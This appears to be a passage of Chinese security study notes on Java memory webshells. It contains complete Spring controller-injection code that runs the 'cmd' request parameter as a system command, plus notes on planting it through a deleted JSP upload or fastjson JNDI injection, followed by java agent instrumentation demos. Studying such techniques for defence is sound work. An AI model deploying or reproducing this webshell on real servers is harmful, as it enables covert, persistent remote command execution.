\u201cSpring\u5e94\u7528\u4e2d\u53ef\u4ee5\u540c\u65f6\u6709\u591a\u4e2aContext\uff0c\u5176\u4e2d\u53ea\u6709\u4e00\u4e2aRoot Context\uff0c\u5269\u4e0b\u7684\u5168\u662fChild Context \u6240\u6709Child Context\u90fd\u53ef\u4ee5\u8bbf\u95ee\u5728Root Context\u4e2d\u5b9a\u4e49\u7684bean\uff0c\u4f46\u662fRoot Context\u65e0\u6cd5\u8bbf\u95eeChild Context\u4e2d\u5b9a\u4e49\u7684bean \u6240\u6709\u7684Context\u5728\u521b\u5efa\u540e\uff0c\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e00\u4e2a\u5c5e\u6027\u6dfb\u52a0\u5230\u4e86ServletContext\u4e2d\u201d \u83b7\u53d6\u4e0a\u4e0b\u6587\u73af\u5883\u5757\u7684\u65b9\u6cd5\u6709\u8fd9\u4e9b\uff1a \u524d\u4e24\u79cd\u83b7\u5f97RootWebApplicationContext\uff0c\u540e\u4e24\u79cd\u83b7\u5f97Child WebApplicationContext WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext()); WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext(); WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()); WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); \"\u4e0a\u6587\u5c55\u793a\u7684\u56db\u79cd\u83b7\u5f97\u5f53\u524d\u4ee3\u7801\u8fd0\u884c\u65f6\u7684\u4e0a\u4e0b\u6587\u73af\u5883\u7684\u65b9\u6cd5\u4e2d\uff0c\u63a8\u8350\u4f7f\u7528\u540e\u9762\u4e24\u79cd\u65b9\u6cd5\u83b7\u5f97 Child WebApplicationContext\u3002 \u8fd9\u662f\u56e0\u4e3a\uff1a\u6839\u636e\u4e60\u60ef\uff0c\u5728\u5f88\u591a\u5e94\u7528\u914d\u7f6e\u4e2d\u6ce8\u518cController \u7684 component-scan \u7ec4\u4ef6\u90fd\u914d\u7f6e\u5728\u7c7b\u4f3c\u7684 dispatcherServlet-servlet.xml \u4e2d\uff0c\u800c\u4e0d\u662f\u5168\u5c40\u914d\u7f6e\u6587\u4ef6 applicationContext.xml \u4e2d\u3002 \u8fd9\u6837\u5c31\u5bfc\u81f4 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean \u53ea\u5b58\u5728\u4e8e Child WebApplicationContext \u73af\u5883\u4e2d\uff0c\u800c\u4e0d\u662f Root WebApplicationContext \u4e2d\u3002\u4e0a\u6587\u4e5f\u63d0\u5230\u8fc7\uff0cRoot Context\u65e0\u6cd5\u8bbf\u95eeChild Context\u4e2d\u5b9a\u4e49\u7684 bean\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u5bfc\u81f4 Root WebApplicationContext \u83b7\u5f97\u4e0d\u4e86 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean \u7684\u60c5\u51b5\u3002\" 1.\u5728 spring 4.0 \u53ca\u4ee5\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 registerMapping \u76f4\u63a5\u6ce8\u518c requestMapping \uff0c\u8fd9\u662f\u6700\u76f4\u63a5\u7684\u4e00\u79cd\u65b9\u5f0f\u3002 RequestMappingHandlerMapping \u7c7b\u7684registerMapping\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u6ce8\u518cController. // 1. \u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class); // 2. \u901a\u8fc7\u53cd\u5c04\u83b7\u5f97\u81ea\u5b9a\u4e49 controller \u4e2d\u552f\u4e00\u7684 Method \u5bf9\u8c61 Method method = (Class.forName(\"me.landgrey.SSOLogin\").getDeclaredMethods())[0]; // 3. \u5b9a\u4e49\u8bbf\u95ee controller \u7684 URL \u5730\u5740 PatternsRequestCondition url = new PatternsRequestCondition(\"/hahaha\"); // 4. \u5b9a\u4e49\u5141\u8bb8\u8bbf\u95ee controller \u7684 HTTP \u65b9\u6cd5\uff08GET/POST\uff09 RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. \u5728\u5185\u5b58\u4e2d\u52a8\u6001\u6ce8\u518c controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); r.registerMapping(info, Class.forName(\"me.landgrey.SSOLogin\").newInstance(), method); registerHandler // 1. \u5728\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u6ce8\u518c\u4e00\u4e2a\u540d\u4e3a dynamicController \u7684 Webshell controller \u5b9e\u4f8b bean context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"me.landgrey.SSOLogin\").newInstance()); // 2. \u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 DefaultAnnotationHandlerMapping \u7684\u5b9e\u4f8b bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. \u53cd\u5c04\u83b7\u5f97 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(\"registerHandler\", String.class, Object.class); m1.setAccessible(true); // 4. \u5c06 dynamicController \u548c URL \u6ce8\u518c\u5230 handlerMap \u4e2d m1.invoke(dh, \"/favicon\", \"dynamicController\"); detectHandlerMethods context.getBeanFactory().registerSingleton(\"dynamicController\", Class.forName(\"me.landgrey.SSOLogin\").newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(\"detectHandlerMethods\", Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, \"dynamicController\");","title":"\u521b\u5efacontroller"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#_2","text":"\u5982\u4f55\u5728\u5b9e\u6218\u4e2d\u5199\u5165controller\u5185\u5b58\u9a6c\u5462\uff1f 1.\u4e0a\u4f20\u4e00\u4e2a\u6ce8\u518ccontroller\u7684JSP\u6587\u4ef6\u5e76\u8bbf\u95ee\uff0c\u7136\u540e\u628aJSP\u5220\u4e86\u3002 2.JNDI\u6ce8\u5165\uff0c\u5982\u679c\u6709fastjson\u7b49\u7ec4\u4ef6\u4e14\u6709\u6d1e\uff0c\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\uff0c\u5b8c\u5168\u5730\u4e0d\u843d\u5730\u3002 \u7f51\u4e0a\u5ad6\u7684\u4ee3\u7801\u3002 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.ArrayList; import java.util.Iterator; import java.util.List; import java.util.Map; public class InjectToController { // \u7b2c\u4e00\u4e2a\u6784\u9020\u51fd\u6570 public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. \u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // \u53ef\u9009\u6b65\u9aa4\uff0c\u5224\u65adurl\u662f\u5426\u5b58\u5728 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List<String> urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/malicious\".equals(urlPath)){ System.out.println(\"url\u5df2\u5b58\u5728\"); return; } } // \u53ef\u9009\u6b65\u9aa4\uff0c\u5224\u65adurl\u662f\u5426\u5b58\u5728 // 2. \u901a\u8fc7\u53cd\u5c04\u83b7\u5f97\u81ea\u5b9a\u4e49 controller \u4e2dtest\u7684 Method \u5bf9\u8c61 Method method2 = InjectToController.class.getMethod(\"test\"); // 3. \u5b9a\u4e49\u8bbf\u95ee controller \u7684 URL \u5730\u5740 PatternsRequestCondition url = new PatternsRequestCondition(\"/malicious\"); // 4. \u5b9a\u4e49\u5141\u8bb8\u8bbf\u95ee controller \u7684 HTTP \u65b9\u6cd5\uff08GET/POST\uff09 RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. \u5728\u5185\u5b58\u4e2d\u52a8\u6001\u6ce8\u518c controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // \u521b\u5efa\u7528\u4e8e\u5904\u7406\u8bf7\u6c42\u7684\u5bf9\u8c61\uff0c\u52a0\u5165\u201caaa\u201d\u53c2\u6570\u662f\u4e3a\u4e86\u89e6\u53d1\u7b2c\u4e8c\u4e2a\u6784\u9020\u51fd\u6570\u907f\u514d\u65e0\u9650\u5faa\u73af InjectToController injectToController = new InjectToController(\"aaa\"); mappingHandlerMapping.registerMapping(info, injectToController, method2); } // \u7b2c\u4e8c\u4e2a\u6784\u9020\u51fd\u6570 public InjectToController(String aaa) {} // controller\u6307\u5b9a\u7684\u5904\u7406\u65b9\u6cd5 public void test() throws IOException{ // \u83b7\u53d6request\u548cresponse\u5bf9\u8c61 HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); // \u83b7\u53d6cmd\u53c2\u6570\u5e76\u6267\u884c\u547d\u4ee4 java.lang.Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } }","title":"\u5199\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#_3","text":"\u83b7\u53d6\u4e0a\u4e0b\u6587\uff08\u5b50\u4e0a\u4e0b\u6587\u6700\u597d\uff0c\u56e0\u4e3aROOT applicationContext\u4e0d\u4e00\u5b9a\u80fd\u83b7\u5f97\u6211\u4eec\u60f3\u8981\u7684bean\uff0c\u800cChildapplication\u53ef\u4ee5\uff09\u4ece\u5f53\u524d\u4e0a\u4e0b\u6587\u73af\u5883\u4e2d\u83b7\u5f97 RequestMappingHandlerMapping \u7684\u5b9e\u4f8b bean \u5411RequestMappingInfo\u4f20\u5165HTTP\u65b9\u6cd5\u548curl\u83b7\u53d6\u4e00\u4e2aRequestMappingInfo\u5bf9\u8c61\uff08info\uff09 \u5b9a\u4e49Method\u5bf9\u8c61\uff0c\u4ee5\u53ca\u4efb\u610f\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6267\u884cregisterMapping\u51fd\u6570\u5b8c\u6210\u6ce8\u518c mappingHandlerMapping.registerMapping(info, injectToController, method2);","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/#_4","text":"https://www.anquanke.com/post/id/198886#h3-7 https://www.cnblogs.com/bitterz/p/14820898.html#11-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjndi","title":"\u672c\u8282\u53c2\u8003"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/","text":"java agent\u5185\u5b58\u9a6c \u76ee\u5f55 What is java agent \u542f\u52a8\u524d\u52a0\u8f7d \u64cd\u4f5c \u542f\u52a8\u540e\u52a0\u8f7d \u64cd\u4f5c \u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801 addTransformer getAllLoadedClasses retransformClasses Demo agent\u5185\u5b58\u9a6c\u6ce8\u5165 \u5b9e\u64cd \u5751\u70b9 What is java agent agent,\u662fJDK1.5\u63d0\u51fa\u7684\u4e00\u4e2a\u673a\u5236\u3002 \u5b83\u8d77\u5230\u4e86 \"\u4ee3\u7406\"\u7684\u4f5c\u7528\uff0c\u5c31\u50cfBurpSuite\u53ef\u4ee5\u5bf9\u6d4f\u89c8\u5668\u8fdb\u884c\u4ee3\u7406\u3001\u6293\u5305\uff0cjavaagent\u4e5f\u53ef\u4ee5\u5bf9java\u7a0b\u5e8f\u7684\u4fe1\u606f\u8fdb\u884c\u76d1\u63a7\u3001\u4fee\u6539\u7b49\u64cd\u4f5c\u3002 JDK1.5\u540e\u5f15\u5165\u4e86 java.lang.instrument \u5305\uff0c\u8fd9\u4e2a\u5305\u7528\u4e8e\u5b9e\u73b0javaagent\u8fd9\u4e2a\u673a\u5236\uff0c\u5b83\u91cc\u9762\u7684API\u53ef\u4ee5\u5728\u4e0d\u5f71\u54cd\u76ee\u6807java\u7a0b\u5e8f\u6b63\u5e38\u7f16\u8bd1\u7684\u60c5\u51b5\u4e0b \u52a8\u6001\u4fee\u6539\u5176\u5b57\u8282\u7801\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u52a8\u6001\u4fee\u6539\u5176\u7c7b\u3001\u65b9\u6cd5\u3001\u5c5e\u6027 \u7b49\u4fe1\u606f\u3002 javaagent\u7684\u52a0\u8f7d\u5206\u4e3a\u542f\u52a8\u524d\u52a0\u8f7d\uff08 jdk 1.5 \u4ee5\u540e\uff09\u548c\u542f\u52a8\u540e\u52a0\u8f7d\uff08jdk1.6\u4ee5\u540e\uff09\uff0c\u5206\u522b\u5bf9\u5e94\u7740premain \u65b9\u6cd5\u548cagentmain \u65b9\u6cd5\u3002 \u542f\u52a8\u524d\u52a0\u8f7d \u542f\u52a8\u524d\u52a0\u8f7d\u7684\u539f\u7406\u662f\uff1a\u5728java\u7a0b\u5e8fmain\u51fd\u6570\u6267\u884c\u524d\uff0c\u5148\u6267\u884cjava agent\u8bbe\u5b9a\u7684premain\u65b9\u6cd5\u3002\u8fd9\u4e2a\u65b9\u6cd5\u5728JDK1.5\u88ab\u63d0\u4f9b\u4e86\u51fa\u6765\u3002 \u64cd\u4f5c \u9996\u5148\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u666e\u901a\u7684\u7c7b public class test { public static void main(String[] args){ System.out.println(\"Hello World!\"); } } \u4e3a\u5176\u7f16\u5199\u6253\u5305jar\u65f6\u6240\u9700\u8981\u7684\u7684mainfest\u6587\u4ef6,test.mf\u3002\uff08\u6ce8\u610fmf\u6587\u4ef6\u4e2d\u9700\u8981\u6709\u4e00\u884c\u7a7a\u884c\uff09 Manifest-Version: 1.0 Main-Class: test \u518d\u521b\u5efa\u4e00\u4e2aagent\u7c7b import java.lang.instrument.Instrumentation; public class agen { public static void premain(String agentArgs, Instrumentation inst) throws Exception{ System.out.println(agentArgs); } } \u7f16\u5199mainfest,agen.mf Manifest-Version: 1.0 Premain-Class: agen \u7136\u540e\u6267\u884c\u4ee5\u4e0b\u6307\u4ee4\uff0c\u83b7\u5f97test.jar\u548cagen.jar \u7136\u540e\u7528\u4ee5\u4e0b\u6307\u4ee4\u5728test.jar\u7a0b\u5e8f\u6267\u884c\u524d\u5148\u6267\u884cagen.jar java -javaagent:agen.jar[=options] -jar test.jar \u53ef\u4ee5\u53d1\u73b0\u6211\u4eecpremain\u4e2d\u7684\u4ee3\u7801\u6bd4main\u4e2d\u7684\u4ee3\u7801\u4f18\u5148\u6267\u884c\u4e86\u3002 \u542f\u52a8\u540e\u52a0\u8f7d \u542f\u52a8\u540e\u52a0\u8f7d\u539f\u7406\u662f\uff1a\u5728java\u7a0b\u5e8f\u542f\u52a8\u540e\uff0c\u4f7f\u5176\u6307\u5411\u6211\u4eec\u8bbe\u5b9a\u7684agentmain\u65b9\u6cd5\u3002agent\u5185\u5b58\u9a6c\u6ce8\u5165\u591a\u7528\u7684\u662f\u8fd9\u79cd\u65b9\u5f0f\u3002 \u8981\u5b9e\u73b0\u542f\u52a8\u540e\u52a0\u8f7d\u9700\u8981\u4e24\u4e2ajava\u6587\u4ef6\uff0c\u4e00\u4e2a\u5b9a\u4e49agentmain\u65b9\u6cd5\uff0c\u4e00\u4e2a\u8d77\u5230\u6ce8\u5165\u5668\u7684\u4f5c\u7528\u3002 \u64cd\u4f5c \u9996\u5148\u5199agen.java import java.lang.instrument.Instrumentation; public class agen{ public static void agentmain(String agentArgs, Instrumentation inst) { for (int i = 0; i < 10; i++) { System.out.println(\"agentmain gogogogo\"); } } } inject.java import com.sun.tools.attach.AgentInitializationException; import com.sun.tools.attach.AgentLoadException; import com.sun.tools.attach.AttachNotSupportedException; import com.sun.tools.attach.VirtualMachine; import java.io.IOException; public class inject{ public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { String id = args[0]; String jarName = args[1]; System.out.println(\"id ==> \" + id); System.out.println(\"jarName ==> \" + jarName); VirtualMachine virtualMachine = VirtualMachine.attach(id); virtualMachine.loadAgent(jarName); virtualMachine.detach(); //\u65ad\u5f00\u4e0e\u76ee\u6807JVM\u7684\u94fe\u63a5 System.out.println(\"ends\"); } } test.java public class test { public static void main(String[] args){ System.out.println(\"main begin!\"); while(true){ } } } \u7136\u540e\u5206\u522b\u6253\u5305\u6210jar\u5305\uff0c\u5176\u4e2dagen.java\u7684mf\u6587\u4ef6\u9700\u8981\u8fd9\u6837\u5199 Manifest-Version: 1.0 Agent-Class: agen \u8fd9\u91cc\u8f93\u5165test.jar \u542f\u52a8\u540e\u7684PID\u4ee5\u53caagentmain\u5bf9\u5e94\u7684jar\u5305 \u53ef\u4ee5\u53d1\u73b0\u786e\u5b9e\u6ce8\u5165\u4e86test.jar\uff0c\u4e14\u6267\u884c\u4e86agentmain\u91cc\u7684\u65b9\u6cd5\u3002 \u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801 \u4e0a\u6587\u8bb2\u8ff0\u4e86agent\u7684\u6982\u5ff5\u4ee5\u53ca\u4e24\u79cd\u52a0\u8f7d\u65b9\u5f0f\uff0c\u4e0b\u9762\u4f1a\u5bf9javaagent\u4fee\u6539\u5b57\u8282\u7801\u8fd9\u4e00\u529f\u80fd\u8fdb\u884c\u8be6\u7ec6\u53d9\u8ff0\u3002 \u52a8\u6001\u4fee\u6539\u5b57\u8282\u7801\u662f\u4f7f\u7528Instrumentation\u6765\u5b9e\u73b0\u7684\uff0cjavaagent\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u4e0e\u76ee\u6807JVM\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u4fee\u6539\u5176\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u4fee\u6539\u5176\u5b57\u8282\u7801\u3002 \u8fd9\u4e2a\u7c7b\u662f\u4e00\u4e2a\u63a5\u53e3\u7c7b\uff0c\u5b83\u6709\u5982\u4e0b\u65b9\u6cd5\u3002 public interface Instrumentation { //\u589e\u52a0\u4e00\u4e2aClass\u6587\u4ef6\u8f6c\u6362\u5668 void addTransformer(ClassFileTransformer transformer); // \u5220\u9664\u4e00\u4e2a\u7c7b\u8f6c\u6362\u5668 boolean getAllLoadedClasses(ClassFileTransformer transformer); // \u5728\u7c7b\u52a0\u8f7d\u4e4b\u540e\uff0c\u91cd\u65b0\u5b9a\u4e49 Class\u3002\u8fd9\u4e2a\u5f88\u91cd\u8981\uff0c\u8be5\u65b9\u6cd5\u662f1.6 \u4e4b\u540e\u52a0\u5165\u7684\uff0c\u4e8b\u5b9e\u4e0a\uff0c\u8be5\u65b9\u6cd5\u662f update \u4e86\u4e00\u4e2a\u7c7b\u3002 void retransformClasses(Class<?>... classes) throws UnmodifiableClassException; // \u5224\u65ad\u76ee\u6807\u7c7b\u662f\u5426\u80fd\u591f\u4fee\u6539\u3002 boolean isModifiableClass(Class<?> theClass); // \u83b7\u53d6\u76ee\u6807\u5df2\u7ecf\u52a0\u8f7d\u7684\u7c7b\u3002 @SuppressWarnings(\"rawtypes\") Class[] getAllLoadedClasses(); ...... } \u5bf9\u4e8e\u4fee\u6539\u5b57\u8282\u7801\uff0c\u6bd4\u8f83\u91cd\u8981\u7684\u65b9\u6cd5\u6709addTransformer\u3001getAllLoadedClasses\u3001retransformClasses \u7b49\u3002 \u5bf9\u4e8e\u8fd9\u4e9b\u65b9\u6cd5\uff0c\u6709\u4e00\u4e2a\u6bd4\u8f83\u91cd\u8981\u7684\u6982\u5ff5\u662fTransformer\uff0c\u5b83\u4f1a\u62e6\u622a\u5df2\u52a0\u8f7d\u7684\u6216\u8005\u6b63\u5728\u52a0\u8f7d\u7684\u7c7b\uff0c\u5e76\u4ea4\u7531\u5185\u90e8\u7684transfrom\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff0c\u51ed\u6b64\u53ef\u4ee5\u7528\u4e8e\u4fee\u6539class\u6587\u4ef6\u7684\u5b57\u8282\u7801\u3002 \u53e6\u5916\uff0c\u60f3\u8981\u8ba9agent\u7c7b\u80fd\u591f\u5b9e\u73b0\u4fee\u6539\u5b57\u8282\u7801\u7b49\u64cd\u4f5c\uff0c\u9700\u8981\u5728mf\u4e2d\u589e\u52a0\u4ee5\u4e0b\u884c\uff0c\u82e5\u6ca1\u6709\u4ee5\u4e0b\u914d\u7f6e\u5219\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62a5\u9519\u3002 Can-Redefine-Classes: true Can-Retransform-Classes: true addTransformer \u901a\u8fc7\u8be5\u65b9\u6cd5\u6765\u6ce8\u518cTransformer\uff0c\u6211\u4eec\u8ddf\u8fdbClassFileTransformer\u7c7b\u6765\u4e00\u7aa5Transformer\u7684\u6a21\u6837\u3002 \u53ef\u4ee5\u53d1\u73b0\u5b83\u4e5f\u662f\u4e00\u4e2a\u63a5\u53e3\u7c7b\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u7ee7\u627f\u4e8e\u5b83\u7684Transformer\u53bb\u5b9e\u73b0\u5b83\u7684transform\u65b9\u6cd5. \u8fd9\u4e2atransform\u8fd4\u56de\u7ed3\u679c\u5373\u8f6c\u6362\u540e\u7684\u5b57\u8282\u7801\u3002 Transformer\u4f1a\u62e6\u622a\u5df2\u52a0\u8f7d\u7684\u6216\u8005\u6b63\u5728\u52a0\u8f7d\u7684\u7c7b\uff0c\u5e76\u4ea4\u7531\u5185\u90e8\u7684transfrom\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\u3002 \u6211\u4eec\u8fd9\u91cc\u5199\u4e2a\u5c0fdemo\u6765\u8f93\u51fa\u6240\u6709\u88abTransformer\u62e6\u622a\u7684\u7c7b\u3002 import java.lang.instrument.Instrumentation; public class agen{ public static void agentmain(String agentArgs, Instrumentation inst) { inst.addTransformer(new DefineTransformer(),true); System.out.println(\"agent gogo\"); Class[] classes = inst.getAllLoadedClasses(); for(Class clas:classes){ System.out.println(clas.getName()); } } } import java.lang.instrument.ClassFileTransformer; import java.lang.instrument.IllegalClassFormatException; import java.security.ProtectionDomain; public class DefineTransformer implements ClassFileTransformer { @Override public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException { System.out.println(className); return new byte[0]; } } getAllLoadedClasses \u8be5\u65b9\u6cd5\u53ef\u4ee5\u5217\u51fa\u6240\u6709\u5df2\u52a0\u8f7d\u7684class\uff0c\u5e76\u4ee5\u6570\u7ec4\u5f62\u5f0f\u8fd4\u56de\u3002 import java.lang.instrument.Instrumentation; public class agen{ public static void agentmain(String agentArgs, Instrumentation inst) { System.out.println(\"agent gogo\"); Class[] classes = inst.getAllLoadedClasses(); for(Class clas:classes){ System.out.println(clas.getName()); } } } retransformClasses \u8fd9\u4e2a\u65b9\u6cd5\u80fd\u5bf9\u5df2\u52a0\u8f7d\u7684class\u8fdb\u884c\u91cd\u65b0\u5b9a\u4e49\uff0c\u53ef\u4ee5\u914d\u5408getAllLoadedClasses\u65b9\u6cd5\u6765\u91cd\u65b0\u5b9a\u4e49\u5df2\u52a0\u8f7d\u5bf9\u8c61\u3002 \u5177\u4f53\u662f\u5c06\u5df2\u52a0\u8f7d\u5bf9\u8c61\u62e6\u622a\uff0c\u4ea4\u7531Transformer#transform \u65b9\u6cd5\u5904\u7406\u3002 Demo \u5bf9\u4e0a\u9762\u7684\u4e09\u4e2a\u65b9\u6cd5\u53ef\u80fd\u6709\u4e86\u70b9\u61f5\u61f5\u61c2\u61c2\u7684\u611f\u89c9\uff0c\u4e0b\u9762\u4f1a\u901a\u8fc7\u4e00\u4e2a\u5185\u5b58\u9a6cDemo\u6765\u66f4\u6df1\u523b\u7684\u8ba4\u8bc6agent\u662f\u5982\u4f55\u4fee\u6539\u5b57\u8282\u7801\u7684\u3002 \u8fd9\u91cc\u76f4\u63a5\u501f\u7528\u6728\u5934\u5e08\u5085\u7684\u56fe\u7247 \u8fd9\u91cc\u7684\u610f\u601d\u662f\u4fbf\u662f\uff1a\u5f53\u52a0\u8f7d\u5230\u6307\u5b9a\u7c7b\u65f6\uff0c\u901a\u8fc7javassist\u6280\u672f\u4fee\u6539\u5176\u5b57\u8282\u7801\uff0c\u5c06\u6076\u610f\u4ee3\u7801\u8fdb\u884c\u690d\u5165\uff0c\u4ece\u800c\u8fbe\u5230\u4e86\u5185\u5b58\u9a6c\u7684\u76ee\u7684\u3002 agent\u5185\u5b58\u9a6c\u6ce8\u5165 \u8fd9\u91cc\u4ee5tomcat Filter \u5185\u5b58\u9a6c\u4e3a\u4f8b\uff0c\u901a\u8fc7agent\u6280\u672f\u5411\u5176\u6ce8\u5165\u5185\u5b58\u9a6c\u3002 tomcat \u8c03\u7528Filter\u7684\u6808\u5e27\u987a\u5e8f\u5982\u4e0b \u4ece\u56fe\u4e2d\u53ef\u4ee5\u770b\u89c1\u5b83\u8c03\u7528\u4e86ApplicationFilterChain#doFilter,\u8fd9\u4e2a\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u4e0b \u5b83\u8c03\u7528\u4e86internalDofilter\u5e76\u4f20\u5165\u4e86request,response\u53c2\u6570\u8fdb\u5165\u4e86\u4e0b\u4e00\u5c42\uff0c\u5f00\u59cb\u8c03\u7528filterchain\u4e2d\u5404filter\u5bf9\u8c61\u7684Dofilter\u65b9\u6cd5\u3002 \u4e0d\u8fc7\u6211\u4eec\u60f3\u8fdb\u884cagent\u6ce8\u5165\uff0c\u5b8c\u5168\u4e0d\u7528\u5230filterchain\u91cc\u53bb\u505a\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u4fee\u6539ApplicationFilterChain#doFilter\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef\u3002 filterchain\u4e2d\u5404filter\u5bf9\u8c61\u8c03\u7528Dofilter\u65b9\u6cd5\u6240\u9700\u8981\u7684\u53c2\u6570\u4ec5\u4ec5\u53ea\u8981request\uff0cresponse\u548cfilterchain \u800c\u5176\u4e2dfilterchain\u5c5e\u6027\u7684\u4f5c\u7528\u4ec5\u4ec5\u662f\u53bb\u8c03\u7528filterchain\u4e2d\u4e0b\u4e00\u4e2afilter\u7684Dofilter\u65b9\u6cd5\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u88abDofilter\u65b9\u6cd5\u8c03\u7528\u6765\u5904\u7406\u7528\u6237\u8bf7\u6c42\u7684\u53c2\u6570\u53ea\u6709response\u548crequest. \u4e0b\u56fe\u662f\u4e00\u4e2afilter\u5185\u5b58\u9a6c\uff0c\u53ef\u4ee5\u53d1\u73b0\u5185\u5b58\u9a6c\u4ec5\u5728request\u548cresponse\u4e0a\u505a\u4e86\u6587\u7ae0\u3002 